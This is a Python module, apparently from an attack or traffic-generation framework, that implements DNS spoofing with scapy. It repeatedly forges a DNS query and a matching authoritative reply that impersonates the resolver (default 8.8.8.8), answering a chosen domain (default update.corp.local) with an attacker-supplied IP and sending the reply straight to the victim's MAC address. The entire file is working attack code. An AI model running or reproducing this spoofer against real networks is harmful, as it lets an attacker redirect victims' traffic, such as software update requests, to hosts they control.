import random, time
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp, get_if_hwaddr
from attacks.base import BaseAttack


class DnsSpoof(BaseAttack):
    def run(self):
        target_ip  = self.params.get("target_ip", "")
        spoof_ip   = self.params.get("spoof_ip", "")
        domain     = self.params.get("domain", "update.corp.local")
        dns_server = self.params.get("dns_server", "8.8.8.8")

        if not target_ip or not spoof_ip:
            self.log("DNS Spoof: need target_ip and spoof_ip", "error"); return

        src_mac    = get_if_hwaddr(self.iface)
        victim_mac = self.resolve_mac(target_ip)
        writer     = self.open_pcap()
        sent       = 0

        self.log(f"DNS Spoof: {domain} → {spoof_ip} (victim: {target_ip})", "warn")

        while not self._stop.is_set():
            txid  = random.randint(1, 0xFFFF)
            sport = random.randint(1024, 65535)

            query = (
                Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
                / IP(src=target_ip, dst=dns_server)
                / UDP(sport=sport, dport=53)
                / DNS(id=txid, rd=1, qd=DNSQR(qname=domain, qtype="A"))
            )
            reply = (
                Ether(src=src_mac, dst=victim_mac)
                / IP(src=dns_server, dst=target_ip)
                / UDP(sport=53, dport=sport)
                / DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
                      qd=DNSQR(qname=domain, qtype="A"),
                      an=DNSRR(rrname=domain, type="A", ttl=300, rdata=spoof_ip))
            )

            try:
                sendp(query, iface=self.iface, verbose=False)
                sendp(reply, iface=self.iface, verbose=False)
                self.write(query); self.write(reply)
                sent += 1
                if sent % 20 == 0:
                    self.log(f"DNS Spoof: {sent} query/reply pairs sent", "info")
            except Exception as e:
                self.log(f"DNS Spoof error: {e}", "error"); break
            time.sleep(0.2)

        writer.close()
